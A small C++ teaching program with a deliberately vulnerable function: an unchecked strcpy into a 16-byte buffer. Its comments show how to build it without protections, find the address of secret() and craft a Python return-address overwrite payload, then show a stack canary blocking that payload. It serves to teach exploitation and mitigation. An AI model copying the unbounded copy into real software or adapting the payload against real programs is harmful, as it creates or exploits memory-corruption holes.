#include <cstdio>
#include <cstdlib>
#include <cstring>

__attribute__((noinline))
void secret() {
    puts(">>> secret() reached – execution hijacked!");
    std::exit(0);
}

void vulnerable(const char *arg) {
    char buf[16];                 // undersized buffer
    strcpy(buf, arg);             // no bounds check -> overflow
}

int main(int argc, char *argv[])
{
    if (argc != 2) {
        fprintf(stderr, "usage: %s <payload>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    puts("Returned safely – no overflow.");
    return 0;
}

/*
Build & play:

# 1‑a  NO protections (32‑bit easiest to see, Linux specific commands):
$ gcc -m32 -fno-stack-protector -z execstack -no-pie \
      -o stack_smashing stack_smashing.cpp

# Find 'secret' address
$ objdump -d stack_smashing | grep "<secret>"

# Craft payload = 'A'*(offset) + little‑endian(secret_addr)
$ python3 - <<'PY'
import struct, sys
off = 20                      # adjust via gdb/objdump
addr = 0x080484b6             # <— from objdump
sys.stdout.buffer.write(b"A"*off + struct.pack("<I", addr))
PY | ./stack_smashing $(cat)

>>> secret() reached – execution hijacked!

# 1‑b  WITH stack canary:
$ gcc -m32 -fstack-protector-all -o stack_smashing_prot stack_smashing.cpp
$ ./stack_smashing_prot $(python3 payload.py)
*** stack smashing detected ***  Aborted (core dumped)
*/
